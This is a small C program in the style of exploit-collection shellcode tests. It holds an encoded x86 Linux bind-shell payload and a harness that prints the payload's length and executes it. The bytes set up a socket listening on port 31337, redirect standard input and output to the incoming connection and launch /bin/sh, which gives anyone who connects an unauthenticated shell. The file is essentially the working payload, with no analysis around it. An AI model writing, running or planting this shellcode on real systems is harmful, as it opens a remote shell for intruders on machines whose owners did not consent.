#include <stdio.h>

/* 
 Port High/Low bytes
 Current port 31337 (7a69)
*/

unsigned char code[] = "\x31\xdb\xf7\xe3\x31\xc9\x99\xb0\x66\x43\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x43\xb0\x66\x52\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb3\x04\xb0\x66\x6a\x01\x56\x89\xe1\xcd\x80\x43\xb0\x66\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80\x75\xf8\xf7\xe2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x52\x89\xe2\xb0\x0b\xcd\x80";

int main() {
    printf("Shellcode Length: %d\n", sizeof(code)-1);
    int (*ret)() = (int(*)())code;
    ret();
}